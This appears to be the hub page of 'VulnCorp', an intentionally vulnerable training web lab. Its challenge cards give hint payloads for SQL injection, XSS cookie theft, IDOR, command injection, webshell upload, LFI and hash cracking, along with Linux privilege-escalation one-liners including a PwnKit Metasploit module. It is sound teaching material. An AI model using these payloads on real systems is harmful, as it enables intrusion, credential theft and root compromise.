<?php header('Cache-Control: no-store, max-age=0'); /* VulnCorp hub */ ?>
<!doctype html><html lang="en"><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1"><title>VulnCorp — Challenges</title>
<style>
:root{--bg:#0b0f16;--card:#0d1117;--card2:#161b22;--ink:#dfe6ee;--muted:#8b98a5;--line:#1c2330;--brand:#1f6feb;--ok:#2e9b4f}
*{box-sizing:border-box}body{font-family:system-ui,Segoe UI,Arial,sans-serif;background:var(--bg);color:var(--ink);margin:0;line-height:1.5}
.topbar{position:sticky;top:0;z-index:5;background:linear-gradient(120deg,#0e1726,#1f6feb);color:#fff;padding:12px 18px;display:flex;align-items:center;gap:12px;box-shadow:0 2px 10px rgba(0,0,0,.4)}
.brand{font-weight:700;font-size:1.15em}.badge{font-size:.72em;background:rgba(255,255,255,.18);padding:2px 9px;border-radius:20px}
.nav{margin-left:auto;display:flex;gap:8px;flex-wrap:wrap}.nav a{color:#fff;text-decoration:none;font-size:.85em;background:rgba(255,255,255,.14);padding:5px 11px;border-radius:7px}.nav a:hover{background:rgba(255,255,255,.28)}
.wrap{max-width:900px;margin:22px auto;padding:0 16px}
.card{background:var(--card);border:1px solid var(--line);border-radius:12px;padding:16px 18px;margin:14px 0}
.card h2{margin:0 0 8px;font-size:1.02em;color:#8ab4ff;display:flex;align-items:center;gap:8px;flex-wrap:wrap}
.card h2 code{background:#0b0f16;color:#9ce6a0;padding:2px 7px;border-radius:5px;font-size:.92em}
.flag-pill{font-size:.7em;font-weight:600;background:#3a2d12;color:#ffd080;padding:2px 8px;border-radius:20px}
details{margin:6px 0 10px}summary{cursor:pointer;color:var(--brand);font-size:.9em}
details .pl{display:block;margin:8px 0;background:#05070b;color:#9ce6a0;padding:8px 10px;border-radius:6px;font-family:ui-monospace,Consolas,monospace;font-size:.85em;white-space:pre-wrap;word-break:break-all}
form{display:flex;gap:8px;flex-wrap:wrap;align-items:center;margin:4px 0}
input[type=text],textarea{flex:1;min-width:200px;padding:8px 10px;border:1px solid var(--line);border-radius:7px;background:#05070b;color:var(--ink);font-family:ui-monospace,Consolas,monospace;font-size:.9em}
textarea{min-height:70px;width:100%}
button{background:var(--brand);color:#fff;border:0;border-radius:7px;padding:8px 13px;cursor:pointer;font-size:.88em}
button.ghost{background:#1c2330;color:#8ab4ff}button:hover{filter:brightness(1.12)}
.levels{display:flex;gap:6px;margin:8px 0;flex-wrap:wrap}.lvlbtn{background:#1c2330;color:#8b98a5;font-size:.8em;padding:4px 11px}
.lvlbtn.on{background:#1f6feb;color:#fff}.note{color:var(--muted);font-size:.85em}
.card.chal>.cbody{display:none}.card.chal.open>.cbody{display:block}.card.chal>h2{cursor:pointer}
.card.chal>h2::before{content:"▸ ";opacity:.5;font-weight:400}.card.chal.open>h2::before{content:"▾ "}
.urlprev{color:#79c0ff;font-size:.8em;font-family:ui-monospace,Consolas,monospace;margin:6px 0 0;word-break:break-all;opacity:.85}
.res{width:100%;height:200px;border:1px solid var(--line);border-radius:8px;background:#fff;margin-top:8px;display:block}
.rx{white-space:pre-wrap;background:#05070b;color:var(--ink);border:1px solid var(--line);border-radius:8px;padding:10px;margin-top:8px;font-family:ui-monospace,Consolas,monospace;font-size:.85em;display:block;max-height:200px;overflow:auto}
.muted{color:var(--muted);font-size:.92em}a{color:#8ab4ff}
footer{max-width:900px;margin:10px auto 50px;padding:14px 16px;color:var(--muted);font-size:.85em;border-top:1px solid var(--line)}
</style></head><body>
<div class="topbar"><span class="brand">🛡 VulnCorp</span><span class="badge">app 1 · challenge hub</span>
<nav class="nav"><a href="/index.html">🏁 Lab Kit</a><a href="home.php">Home</a><a href="index.php">🎯 Hub</a><a href="progress.php?hub=1">📊 Progress</a><a href="reset.php">↺ Reset</a><a href="feedback.php">💬 Feedback</a></nav></div>
<div class="wrap">
<div class="card"><h2>Challenge hub — fill &amp; run 🏁 <span style="float:right;opacity:.5;font-size:.6em;font-weight:400">loaded <?php echo date('H:i:s'); ?></span></h2>
<p class="muted">There are <b>two ways</b> to use this lab — same vulnerable code behind both:</p>
<ul class="muted" style="margin:4px 0 8px;line-height:1.7">
  <li>🎯 <b>Hub (this page)</b> — the <b>fancy, guided</b> console: pick a card, choose a level, click
      <b>💡 hint → use this → Run</b>, and the answer shows in the panel. Best for <b>learning and comparing levels</b>.</li>
  <li>🏠 <b><a href="home.php">Home</a></b> — the <b>plain</b> VulnCorp app (search, login, profile, upload…).
      Less pretty, but <b>more direct/functional</b>: you drive the real pages and craft payloads in the URL yourself, like a real target. Use it when the hub feels fiddly.</li>
</ul>
<p class="muted">Work out the payload yourself; stuck → reveal the <b>💡 hint</b>. Full walkthroughs in <code>SOLUTIONS.md</code>.</p></div>

<!-- Login: SQLi bypass + weak creds -->
<div class="card"><h2><code>login.php</code> <span class="flag-pill">🏁 SQLi auth-bypass</span> <span class="flag-pill">weak creds</span></h2>
  <p class="muted">The login query is built straight from your input with no sanitisation → SQL injection. <b>Goal:</b> log in as <code>admin</code> without knowing the password. The input filter gets stricter each level, and some accounts also use weak/guessable passwords.</p>
  <div class="levels" id="lv_login"><button type="button" class="lvlbtn" data-l="easy" onclick="setLvl('login','easy')">Easy</button><button type="button" class="lvlbtn" data-l="medium" onclick="setLvl('login','medium')">Medium</button><button type="button" class="lvlbtn" data-l="hard" onclick="setLvl('login','hard')">Hard</button><button type="button" class="lvlbtn" data-l="expert" onclick="setLvl('login','expert')">Expert</button></div>
  <details><summary>💡 hint — <span class="note" id="note_login"></span></summary><code class="pl" id="pl_login"></code>
    <button type="button" class="ghost" onclick="document.getElementById('in_lu').value=document.getElementById('pl_login').textContent;document.getElementById('in_lp').value='x';document.getElementById('in_lu').dispatchEvent(new Event('input'))">use this ▶</button>
    <span class="muted"> · or weak creds <code>admin : S3ntinel!Admin</code></span></details>
  <form method="post" action="login.php?embed=1" target="r_login" onsubmit="show('r_login')">
    <input type="hidden" name="level" id="lvl_login" value="easy">
    <input type="text" id="in_lu" name="username" placeholder="username" style="min-width:140px">
    <input type="text" id="in_lp" name="password" placeholder="password" style="min-width:140px"><button>Login ▶</button></form>
  <iframe name="r_login" id="r_login" class="res"></iframe></div>

<!-- Search: UNION SQLi (leveled) -->
<div class="card"><h2><code>home.php?q=</code> <span class="flag-pill">🏁 UNION SQLi</span> <span class="flag-pill">🏁 reflected XSS</span></h2>
  <p class="muted">One search box, two bugs. <b>UNION SQLi</b> — your input is concatenated into the query, so you can read data straight from the database. <b>Reflected XSS</b> — the same input is echoed back into the page unescaped, so your markup runs in the browser. <b>Goal:</b> dump a secret from the DB, or get script to run in the page. Both filters escalate per level; the expert SQLi level is blind (TRUE/FALSE only).</p>
  <div class="levels" id="lv_q"><button type="button" class="lvlbtn" data-l="easy" onclick="setLvl('q','easy')">Easy</button><button type="button" class="lvlbtn" data-l="medium" onclick="setLvl('q','medium')">Medium</button><button type="button" class="lvlbtn" data-l="hard" onclick="setLvl('q','hard')">Hard</button><button type="button" class="lvlbtn" data-l="expert" onclick="setLvl('q','expert')">Expert</button></div>
  <details><summary>💡 hint — <span class="note" id="note_q"></span></summary>
    <code class="pl" id="pl_q"></code><button type="button" class="ghost" onclick="fill('in_q','pl_q')">use SQLi ▶</button>
    <code class="pl" id="pl_qx"></code><button type="button" class="ghost" onclick="fill('in_q','pl_qx')">use XSS ▶</button></details>
  <form method="get" action="home.php" target="r_q" onsubmit="show('r_q')">
    <input type="hidden" name="level" id="lvl_q" value="easy"><input type="hidden" name="embed" value="1">
    <input type="text" id="in_q" name="q" placeholder="your SQLi payload…"><button>Run ▶</button></form>
  <iframe name="r_q" id="r_q" class="res"></iframe></div>

<!-- Guestbook: stored XSS (leveled) -->
<div class="card"><h2><code>index.php</code> guestbook <span class="flag-pill">🏁 stored XSS</span></h2>
  <p class="muted">Your comment is <b>stored</b> and rendered to <b>every</b> visitor through the level's output filter, so injected markup runs in their browser — not just yours. The page sets a <b>non-HttpOnly</b> <code>flag</code> cookie. <b>Goal:</b> get your script to run and steal that cookie. The filter escalates per level.</p>
  <div class="levels" id="lv_gb"><button type="button" class="lvlbtn" data-l="easy" onclick="setLvl('gb','easy')">Easy</button><button type="button" class="lvlbtn" data-l="medium" onclick="setLvl('gb','medium')">Medium</button><button type="button" class="lvlbtn" data-l="hard" onclick="setLvl('gb','hard')">Hard</button><button type="button" class="lvlbtn" data-l="expert" onclick="setLvl('gb','expert')">Expert</button></div>
  <details><summary>💡 hint — <span class="note" id="note_gb"></span></summary>
    <code class="pl" id="pl_gb"></code><button type="button" class="ghost" onclick="fill('in_gb','pl_gb')">use this ▶</button></details>
  <form method="post" action="home.php" target="r_gb" onsubmit="show('r_gb')">
    <input type="hidden" name="level" id="lvl_gb" value="easy"><input type="hidden" name="embed" value="1">
    <input type="text" name="author" placeholder="name" style="min-width:120px">
    <input type="text" id="in_gb" name="body" placeholder="message / payload…"><button>Post ▶</button></form>
  <iframe name="r_gb" id="r_gb" class="res"></iframe></div>

<!-- Profile: IDOR (leveled) -->
<div class="card"><h2><code>profile.php?id=</code> <span class="flag-pill">🏁 IDOR</span></h2>
  <p class="muted">The profile shown is chosen from the <code>id</code> in your request, with <b>no check that you own it</b> → IDOR: change the id to read <b>other users'</b> records. The id reference is obfuscated a little more each level (but always forgeable), and each record's note is stored in a progressively harder form (plaintext → base64 → hash → salted hash), so recovering them all is decode/crack practice.</p>
  <div class="levels" id="lv_id"><button type="button" class="lvlbtn" data-l="easy" onclick="setLvl('id','easy')">Easy</button><button type="button" class="lvlbtn" data-l="medium" onclick="setLvl('id','medium')">Medium</button><button type="button" class="lvlbtn" data-l="hard" onclick="setLvl('id','hard')">Hard</button><button type="button" class="lvlbtn" data-l="expert" onclick="setLvl('id','expert')">Expert</button></div>
  <details><summary>💡 hint — <span class="note" id="note_id"></span></summary>
    <code class="pl" id="pl_id"></code><button type="button" class="ghost" onclick="fill('in_id','pl_id')">use this ▶</button></details>
  <form method="get" action="profile.php" target="r_id" onsubmit="show('r_id')">
    <input type="hidden" name="level" id="lvl_id" value="easy"><input type="hidden" name="embed" value="1">
    <input type="text" id="in_id" name="id" placeholder="id (or encoded id)…" style="min-width:170px"><button>Run ▶</button></form>
  <div id="id_expert" style="display:none">
    <p class="muted"><b>Expert (cookie-trust):</b> the <code>?id</code> is ignored — the server trusts a <code>uid</code> cookie as your identity. Become another user without touching the URL:</p>
    <button type="button" class="ghost" onclick="setUid(1)">become uid=1 (admin) ▶</button>
    <button type="button" class="ghost" onclick="clearUid()">clear uid</button>
    <span class="muted" style="font-size:.82em">— sets <code>uid</code> <b>scoped to <code>/profile.php</code></b> (only this exercise, not the whole site), then reloads. Manual equivalent: DevTools → Application → Cookies → add <code>uid=1</code>.</span>
  </div>
  <iframe name="r_id" id="r_id" class="res"></iframe></div>

<!-- Net Tools: command injection (leveled) -->
<div class="card"><h2><code>tools.php?host=</code> <span class="flag-pill">🏁 command injection</span></h2>
  <p class="muted">Your input is placed directly into a shell <code>ping</code> command → command injection (RCE). <b>Goal:</b> run your own commands on the host and read the flag. The character filter gets stricter each level, and the expert level returns no output (blind — you exfiltrate another way).</p>
  <div class="levels" id="lv_cmd"><button type="button" class="lvlbtn" data-l="easy" onclick="setLvl('cmd','easy')">Easy</button><button type="button" class="lvlbtn" data-l="medium" onclick="setLvl('cmd','medium')">Medium</button><button type="button" class="lvlbtn" data-l="hard" onclick="setLvl('cmd','hard')">Hard</button><button type="button" class="lvlbtn" data-l="expert" onclick="setLvl('cmd','expert')">Expert</button></div>
  <details><summary>💡 hint — <span class="note" id="note_cmd"></span></summary>
    <code class="pl" id="pl_cmd"></code><button type="button" class="ghost" onclick="fill('in_cmd','pl_cmd')">use this ▶</button></details>
  <form method="get" action="tools.php" target="r_cmd" onsubmit="show('r_cmd')">
    <input type="hidden" name="level" id="lvl_cmd" value="easy"><input type="hidden" name="embed" value="1">
    <input type="text" id="in_cmd" name="host" placeholder="host; command…"><button>Run ▶</button></form>
  <div id="cmd_step2" style="display:none">
    <p class="muted"><b>Step 2 (blind exfil):</b> your payload redirected the flag into <code>uploads/pwn.txt</code> — a file under the web root. Read it at its full URL:</p>
    <form onsubmit="document.getElementById('r_cmd').src=document.getElementById('readpath').value; show('r_cmd'); return false;">
      <input type="text" id="readpath" value="http://<?php echo htmlspecialchars($_SERVER['HTTP_HOST'] ?? 'localhost:8000'); ?>/uploads/pwn.txt" placeholder="full URL of the file you wrote"><button class="ghost">📄 read ▶</button></form>
  </div>
  <iframe name="r_cmd" id="r_cmd" class="res"></iframe></div>

<!-- Page: LFI (leveled) -->
<div class="card"><h2><code>home.php?page=</code> <span class="flag-pill">🏁 LFI / path traversal</span></h2>
  <p class="muted">The <code>page</code> parameter is included from the <code>pages/</code> folder with no sanitisation → local file inclusion / traversal. <b>Goal:</b> make the app read a file it shouldn't — including the secret <b>outside</b> the web root. The filter gets stricter each level, and the higher levels hand the file back <b>encoded</b> (decoding what you retrieve is part of the exercise).</p>
  <div class="levels" id="lv_pg"><button type="button" class="lvlbtn" data-l="easy" onclick="setLvl('pg','easy')">Easy</button><button type="button" class="lvlbtn" data-l="medium" onclick="setLvl('pg','medium')">Medium</button><button type="button" class="lvlbtn" data-l="hard" onclick="setLvl('pg','hard')">Hard</button><button type="button" class="lvlbtn" data-l="expert" onclick="setLvl('pg','expert')">Expert</button></div>
  <details><summary>💡 hint — <span class="note" id="note_pg"></span></summary>
    <code class="pl" id="pl_pg"></code><button type="button" class="ghost" onclick="fill('in_pg','pl_pg')">use this ▶</button></details>
  <form method="get" action="home.php" target="r_pg" onsubmit="show('r_pg')">
    <input type="hidden" name="level" id="lvl_pg" value="easy"><input type="hidden" name="embed" value="1">
    <input type="text" id="in_pg" name="page" placeholder="file path…"><button>Run ▶</button></form>
  <iframe name="r_pg" id="r_pg" class="res"></iframe></div>

<!-- Upload: webshell (leveled) -->
<div class="card"><h2><code>upload.php</code> → <code>uploads/</code> <span class="flag-pill">🏁 upload → RCE</span></h2>
  <p class="muted">The upload has no real validation, so you can store a PHP <b>webshell</b> under the web root and execute it → RCE. <b>Goal:</b> get code execution, then use it to read the flag. The content filter gets stricter each level, and the flag you retrieve is in a harder form each level (decode/crack it).</p>
  <div class="levels" id="lv_up"><button type="button" class="lvlbtn" data-l="easy" onclick="setLvl('up','easy')">Easy</button><button type="button" class="lvlbtn" data-l="medium" onclick="setLvl('up','medium')">Medium</button><button type="button" class="lvlbtn" data-l="hard" onclick="setLvl('up','hard')">Hard</button><button type="button" class="lvlbtn" data-l="expert" onclick="setLvl('up','expert')">Expert</button></div>
  <input type="hidden" id="lvl_up" value="easy">
  <p class="note" id="note_up"></p>
  <label class="muted">1) shell code (pre-filled per level) &amp; name</label>
  <textarea id="up_code"></textarea>
  <form onsubmit="doUpload();return false"><input type="text" id="up_name" value="shell.php" style="min-width:120px"><button>Upload ▶</button></form>
  <pre id="r_up" class="rx"></pre>
  <label class="muted">2) run a command through uploads/shell.php — <span id="cap_up" style="color:#9ab">goal</span></label>
  <details><summary>💡 suggested command for this level</summary><code class="pl" id="pl_up">id</code>
    <button type="button" class="ghost" onclick="fill('in_up','pl_up')">use this ▶</button></details>
  <form method="get" action="uploads/shell.php" target="r_upc" onsubmit="show('r_upc')">
    <input type="text" id="in_up" name="cmd" placeholder="command… (e.g. id)"><button>Run ▶</button></form>
  <div class="muted" style="margin-top:4px">quick commands:
    <button type="button" class="ghost" onclick="setCmd('id')">id</button>
    <button type="button" class="ghost" onclick="setCmd('whoami')">whoami</button>
    <button type="button" class="ghost" onclick="setCmd('uname -a')">uname -a</button>
    <button type="button" class="ghost" onclick="setCmd('cat /etc/passwd')">/etc/passwd (users)</button>
    <button type="button" class="ghost" onclick="setCmd('ls -la ..')">ls -la ..</button>
    <button type="button" class="ghost" onclick="setCmd('cat ../private/db_credentials.txt')">db creds</button>
    <button type="button" class="ghost" onclick="setCmd('cat ../private/upload_flag.txt')">read flag</button>
  </div>
  <iframe name="r_upc" id="r_upc" class="res"></iframe></div>

<!-- Info disclosure (leveled) -->
<div class="card"><h2>Information disclosure <span class="flag-pill">🏁 config backup</span></h2>
  <p class="muted">Sensitive files were left reachable that shouldn't be (a config backup, old credential dumps).
    <b>Goal:</b> discover the hidden paths yourself — a classic first stop is
    <a href="robots.txt" target="_blank">/robots.txt</a>, otherwise enumerate/fuzz the server
    (feroxbuster/ffuf) — and recover the leaked admin credential. It's left in a <b>harder form each level</b>
    (plaintext → base64 → unsalted hash → salted hash), so decode/crack what you find.</p>
  <div class="levels" id="lv_disc"><button type="button" class="lvlbtn" data-l="easy" onclick="setLvl('disc','easy')">Easy</button><button type="button" class="lvlbtn" data-l="medium" onclick="setLvl('disc','medium')">Medium</button><button type="button" class="lvlbtn" data-l="hard" onclick="setLvl('disc','hard')">Hard</button><button type="button" class="lvlbtn" data-l="expert" onclick="setLvl('disc','expert')">Expert</button></div>
  <details><summary>💡 hint — <span class="note" id="note_disc"></span></summary><code class="pl" id="pl_disc"></code></details>
</div>

<!-- CSP -->
<div class="card"><h2>Weak CSP <span class="flag-pill">analysis</span></h2>
  <p class="muted">This page ships a <code>Content-Security-Policy</code> — but is it actually protective? Inspect the
  response headers and the cookie flags in your browser's DevTools. <b>Goal:</b> judge whether this CSP really
  prevents the stored-XSS cookie theft from the guestbook, and explain why or why not. (Analysis — no flag.)</p></div>

<!-- Forensics / offline labs -->
<h2 style="margin:26px 0 6px;color:#8ab4ff;font-size:1.15em">🔬 Forensics &amp; offline labs</h2>
<p class="muted" style="margin:0 0 4px">No web form here — these run in your <b>terminal</b> against files you download. Each has 4 levels; full answers are in each lab's <code>solution.md</code>.</p>

<div class="card"><h2>🔐 Certificates &amp; PKI <span class="flag-pill">offline · openssl</span></h2>
  <p class="muted">You're handed certificates from a lab environment: a flawed cert, a CA chain, and a CRL. Inspect, validate and check revocation.</p>
  <p class="muted">📥 <b>Download:</b> <a href="/certificates/bad-webmail.crt" download>bad-webmail.crt</a> · <a href="/certificates/root_ca.pem" download>root_ca.pem</a> · <a href="/certificates/intermediate_ca.pem" download>intermediate_ca.pem</a> · <a href="/certificates/server.pem" download>server.pem</a> · <a href="/certificates/chain.pem" download>chain.pem</a> · <a href="/certificates/revoked.pem" download>revoked.pem</a> · <a href="/certificates/intermediate.crl" download>intermediate.crl</a></p>
  <details><summary>🟢 Easy — inspect <code>bad-webmail.crt</code>, name the 4 flaws</summary><code class="pl">openssl x509 -in bad-webmail.crt -noout -text</code></details>
  <details><summary>🟡 Medium — validate the chain (run it WITHOUT the intermediate first → watch it fail)</summary><code class="pl">openssl verify server.pem                                                     # FAILS: error 20 (no issuer)
openssl verify -CAfile root_ca.pem server.pem                                 # STILL FAILS: root did not sign the leaf — the intermediate did
openssl verify -verbose -show_chain -CAfile root_ca.pem -untrusted intermediate_ca.pem server.pem  # OK — and -show_chain PRINTS the path it built:
#   Chain: depth=0 portal.labkit.local (untrusted) ← depth=1 LabKit Issuing CA (untrusted) ← depth=2 LabKit Root CA (anchor)</code></details>
  <details><summary>🟠 Hard — check revocation (which serial? is server.pem?)</summary><code class="pl">openssl crl -in intermediate.crl -noout -text | grep -A1 'Serial Number'
openssl x509 -in server.pem -noout -serial ; openssl x509 -in revoked.pem -noout -serial</code></details>
  <details><summary>🔴 Expert — CA constraints, fingerprint, hostname match</summary><code class="pl">openssl x509 -in intermediate_ca.pem -noout -ext basicConstraints,keyUsage
openssl x509 -in server.pem -noout -fingerprint -sha256</code></details>
  <p class="muted">Full console + answers → <a href="/certificates/index.html">Certificates hub</a> · <a href="/certificates/solution.md">solution.md</a></p></div>

<div class="card"><h2>📡 Network capture <span class="flag-pill">offline · Wireshark</span></h2>
  <p class="muted">🎯 <b>Goal:</b> recover the hidden credential/flag in each capture using <b>Wireshark</b> — the challenge is choosing the right <b>display filter</b> for the protocol in play.</p>
  <p class="muted"><b>One capture per level</b>, each a different protocol — the skill is picking the right <b>Wireshark display filter</b>. Open each in Wireshark and type the filter in the top bar.</p>
  <details open><summary>🟢 Easy — <a href="/pcap/http_login_cleartext.pcap" download>http_login_cleartext.pcap</a> · cleartext HTTP login</summary><code class="pl">Filter:  http
Right-click the POST ▸ Follow ▸ HTTP Stream   →  username=admin&amp;password=S3ntinel!Admin
Bonus (same capture):  http.authorization  = Basic base64(user:pass)  ·  http.set_cookie  = unsigned base64 JSON token</code></details>
  <details><summary>🟡 Medium — <a href="/pcap/cases/case1_busy_lan_ftp.pcap" download>case1_busy_lan_ftp.pcap</a> · find the login in a busy LAN</summary><code class="pl">Filter:  ftp        (~81 frames of DNS / mDNS / NBNS / SSDP / ARP / HTTP noise — filter to the one plaintext protocol)
Right-click ▸ Follow ▸ TCP Stream  →  USER bmaint / PASS Ftp!Lan2026     (tip: ftp.request.command isolates USER/PASS)</code></details>
  <details><summary>🟠 Hard — <a href="/pcap/cases/case2_dns_exfil.pcap" download>case2_dns_exfil.pcap</a> · data smuggled out over DNS</summary><code class="pl">Filter:  dns        (~51 DNS frames; most are normal browsing — spot the odd one)
dns.qry.name contains "evil-exfil"   →  high-entropy subdomain labels; take each left-most label, join, base32-decode → FLAG{...}</code></details>
  <details><summary>🔴 Expert — <a href="/pcap/cases/case3_ssh_bruteforce.pcap" download>case3_ssh_bruteforce.pcap</a> · brute force on encrypted SSH</summary><code class="pl">Filter:  tcp.port==22 &amp;&amp; tcp.flags.syn==1 &amp;&amp; tcp.flags.ack==0    →  15 connection attempts, all from 10.0.0.66
Statistics ▸ Conversations ▸ TCP  →  14 tiny (reset after the banner) + 1 that transfers data &amp; closes cleanly = the success. Encrypted ≠ invisible.</code></details>
  <p class="muted">Full Wireshark walkthrough → <a href="/pcap/solution.md">solution.md</a> · <a href="/pcap/index.html">Network hub</a></p></div>

<div class="card"><h2>🔓 TLS decryption <span class="flag-pill">🏁 decrypt HTTPS</span></h2>
  <p class="muted">🎯 <b>Goal:</b> decrypt an HTTPS capture in <b>Wireshark</b> with the server's RSA key and read the login/flag — then decrypt a second capture whose key is useless (forward secrecy) using a TLS key log instead. Start → <a href="/tls_decrypt_lab/">/tls_decrypt_lab/</a></p>
  <p class="muted">An encrypted HTTPS capture + the server's recovered <b>RSA private key</b>: add the key, decrypt the session, read the login and flag — then meet a second capture where the key is useless (forward secrecy).</p>
  <p class="muted">📥 <b>Download:</b> <a href="/tls_decrypt_lab/portal_tls.pcap" download>portal_tls.pcap</a> · <a href="/tls_decrypt_lab/server.key" download>server.key</a> · <a href="/tls_decrypt_lab/server.crt" download>server.crt</a> · <a href="/tls_decrypt_lab/portal_pfs.pcap" download>portal_pfs.pcap</a> · <a href="/tls_decrypt_lab/portal_pfs.keys" download>portal_pfs.keys</a> <span class="muted">(run the commands from the folder you saved them in)</span></p>
  <details><summary>🟢 Easy — which cipher / key exchange? why decryptable?</summary><code class="pl">tshark -r portal_tls.pcap -Y "tls.handshake.type==2" -T fields -e tls.handshake.ciphersuite
# 0x003c = TLS_RSA_WITH_AES_128_CBC_SHA256 → static RSA, no forward secrecy</code></details>
  <details><summary>🟡 Medium — add the key, decrypt, read the login + flag</summary><code class="pl">tshark -r portal_tls.pcap -o 'uat:rsa_keys:"server.key",""' -q -z follow,tls,ascii,0
# Wireshark: Prefs → Protocols → TLS → RSA keys list → add server.key → Follow → TLS Stream</code></details>
  <details><summary>🟠 Hard — the same key FAILS on <code>portal_pfs.pcap</code> — why?</summary><code class="pl">tshark -r portal_pfs.pcap -Y "tls.handshake.type==2" -T fields -e tls.handshake.ciphersuite
# 0xc02f = ECDHE → forward secrecy → the private key can't recover the session keys</code></details>
  <details><summary>🔴 Expert — decrypt the ECDHE capture with the key log</summary><code class="pl">tshark -r portal_pfs.pcap -o 'tls.keylog_file:portal_pfs.keys' -q -z follow,tls,ascii,0
# the SSLKEYLOGFILE holds the per-session secrets — the only way against ECDHE</code></details>
  <p class="muted">Answers → <a href="/tls_decrypt_lab/README.md">README</a> · <a href="/tls_decrypt_lab/solution.md">solution.md</a> · <a href="/tls_decrypt_lab/solution_pfs.md">solution (PFS)</a></p></div>

<div class="card"><h2>🗂️ Recon Lab — nested discovery <span class="flag-pill">content discovery</span></h2>
  <p class="muted">Four admin-credential artifacts hidden <b>one per level</b> in a nested directory tree. Every directory name is a <b>common word</b>, so the skill is <b>recursive discovery with a small list</b> — not a bigger one. Start here → <a href="/recon_lab/">/recon_lab/</a></p>
  <details><summary>🟢 Easy — map the whole tree (recommended list: <code>dirb/common.txt</code>)</summary><code class="pl">feroxbuster -u http://localhost:8000/recon_lab/ -w /usr/share/wordlists/dirb/common.txt --add-slash -C 404 -d 5</code></details>
  <details><summary>🟡 Medium — or walk it level by level with ffuf (append each dir you find)</summary><code class="pl">ffuf -ic -u http://localhost:8000/recon_lab/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 200
ffuf -ic -u http://localhost:8000/recon_lab/backup/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 200</code></details>
  <details><summary>🟠 Hard — L3 leaks an unsalted hash (+ <code>notes.txt</code> with cracking tips)</summary><code class="pl">curl -s http://localhost:8000/recon_lab/backup/data/config/hash.txt
hashcat -m 100 hash.txt /usr/share/wordlists/rockyou.txt   # SHA-1, unsalted</code></details>
  <details><summary>🔴 Expert — L5 salted vault dump (<code>hash:salt</code>)</summary><code class="pl">hashcat -m 10 vault.txt /usr/share/wordlists/rockyou.txt   # md5(pass+salt)</code></details>
  <p class="muted">The chain: recurse <code>common.txt</code> → decode the <code>.b64</code> login → crack the two hashes. Lab index → <a href="/recon_lab/">/recon_lab/</a></p></div>

<div class="card"><h2>🧗 Privilege Escalation (Linux) <span class="flag-pill">offline · GTFOBins + Metasploit</span></h2>
  <p class="muted">🎯 <b>Goal:</b> you have a low-priv <code>www-data</code> shell on <code>web01</code> — escalate to <b>root</b> and read <code>/root/flag.txt</code>. Spot <b>all 5</b> privesc vectors in the pre-collected <code>enum/</code> output and write the exact exploit for each. Start → <a href="/privesc/">/privesc/</a></p>
  <details><summary>🟢 sudo — <code>enum/sudo_l.txt</code></summary><code class="pl">(root) NOPASSWD: /usr/bin/find   →   sudo find . -exec /bin/sh \; -quit</code></details>
  <details><summary>🟡 SUID — <code>enum/suid.txt</code></summary><code class="pl">/usr/bin/env is SUID-root   →   /usr/bin/env /bin/sh -p</code></details>
  <details><summary>🟠 cron — <code>enum/cron.txt</code></summary><code class="pl">/opt/scripts/backup.sh world-writable, root runs it every minute:
echo 'cp /bin/bash /tmp/rb && chmod u+s /tmp/rb' >> /opt/scripts/backup.sh     # wait 1 min → /tmp/rb -p</code></details>
  <details><summary>🟠 capability — <code>enum/capabilities.txt</code></summary><code class="pl">/usr/bin/python3.9 = cap_setuid+ep   →   /usr/bin/python3.9 -c 'import os;os.setuid(0);os.system("/bin/sh")'</code></details>
  <details><summary>🔴 pkexec / PwnKit — <code>enum/suid.txt</code> + <code>enum/system.txt</code></summary><code class="pl">pkexec SUID on Ubuntu 21.10   →   CVE-2021-4034 (PwnKit) local root  (public PoC, or the MSF module)</code></details>
  <details><summary>🧰 Metasploit — Meterpreter session → root</summary><code class="pl">use post/multi/recon/local_exploit_suggester ; set SESSION N ; run
use exploit/linux/local/cve_2021_4034_pwnkit_lpe_pkexec ; set SESSION N ; set LHOST &lt;you&gt; ; run   # → root</code></details>
  <p class="muted">Full answers → <a href="/privesc/solution.md">solution.md</a> · reference <a href="https://gtfobins.github.io">GTFOBins</a></p></div>

</div>
<footer>⚠️ <b>Intentionally vulnerable — training only.</b> Run locally / isolated lab; never expose it.</footer>
<script>
function fill(inputId, plId){ var i=document.getElementById(inputId); i.value=document.getElementById(plId).textContent; i.dispatchEvent(new Event('input')); }
function show(frameId){ document.getElementById(frameId).style.display='block'; }
// Expert IDOR: the server trusts a 'uid' cookie. Set it from the Hub, scoped to /profile.php so it is
// sent ONLY to the IDOR endpoint (not the Hub or any other exercise), then reload just this card's frame.
function setUid(v){ document.cookie='uid='+v+'; path=/profile.php'; setLvl('id','expert'); show('r_id'); document.getElementById('r_id').src='profile.php?level=expert&embed=1'; }
function clearUid(){ document.cookie='uid=; path=/profile.php; max-age=0'; show('r_id'); document.getElementById('r_id').src='profile.php?level=expert&embed=1'; }
function setCmd(c){ var i=document.getElementById('in_up'); i.value=c; i.dispatchEvent(new Event('input')); }
const PAYLOADS = {
 q:{
  easy:{p:"' UNION SELECT @@version,current_user(),database()-- -", n:"Easy — raw UNION. Goal: fingerprint the DB (version / DB user / current database) — your first recon."},
  medium:{p:"' UNIunionON SELselectECT table_name,table_schema,3 FROM information_schema.tables WHERE table_schema=database()-- -", n:"Medium — 'union'/'select' stripped once → nest them. Goal: enumerate the tables (schema discovery)."},
  hard:{p:"'/**/UNIunionON/**/SELselectECT/**/username,CONCAT(password,0x3a,salt),role/**/FROM/**/users#", n:"Hard — + spaces stripped → /**/ for spaces, end with #. Goal: dump every user's credentials — passwords are salted MD5, so grab hash:salt (email slot) and crack with hashcat -m 10."},
  expert:{p:"' OR (SELECT SUBSTRING(private_note,1,1) FROM users WHERE username='admin')='F'-- -", n:"Expert — rows are SUPPRESSED (blind match/no-match). This asks 'does admin's private_note start with F?' → match = yes. Walk SUBSTRING(private_note,N,1) and the letter to read the flag char by char (or automate with sqlmap)."}
 },
 cmd:{
  easy:{p:"127.0.0.1; cat private/cmdi_flag.txt", n:"Easy — chain with ;. Reads the flag in PLAINTEXT → FLAG{c0mmand_1njection_rce_on_host}."},
  medium:{p:"127.0.0.1 | cat private/cmdi_flag.b64", n:"Medium — ; & stripped → pipe |. The flag file is BASE64 — pipe it through: ...| base64 -d (or decode the output)."},
